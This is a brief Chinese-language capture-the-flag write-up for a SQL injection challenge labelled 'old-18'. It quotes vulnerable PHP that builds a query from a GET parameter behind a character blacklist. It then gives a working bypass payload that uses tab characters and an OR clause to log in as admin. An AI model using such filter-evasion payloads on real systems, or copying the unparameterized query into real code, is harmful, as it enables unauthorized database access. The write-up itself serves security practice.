# old-18_100

* 進到這一個網頁，就有一個非常大的提示 sql injection 以及 source code 
    ```php=
    if($_GET['no']){
      $db = dbconnect();
      if(preg_match("/ |\/|\(|\)|\||&|select|from|0x/i",$_GET['no'])) exit("no hack");
      $result = mysqli_fetch_array(mysqli_query($db,"select id from chall18 where id='guest' and no=$_GET[no]")); // admin's no = 2

      if($result['id']=="guest") echo "hi guest";
      if($result['id']=="admin"){
        solve(18);
        echo "hi admin!";
      }
    }
    ```
    可以看到有過濾一些字元，如果 id = admin 就過了
* 這一題送是挺基本的 sql injection 的題目，因為前面的 id 已經固定為 guest，所以只要 or 後面加上 id = admin 就可以過了
* 不過要注意的是有過濾空白以及 || 
* 所以我最後的 payload 是 `?no=2%09or%09id=%27admin%27` 要注意的是，這是 url 後面的 param
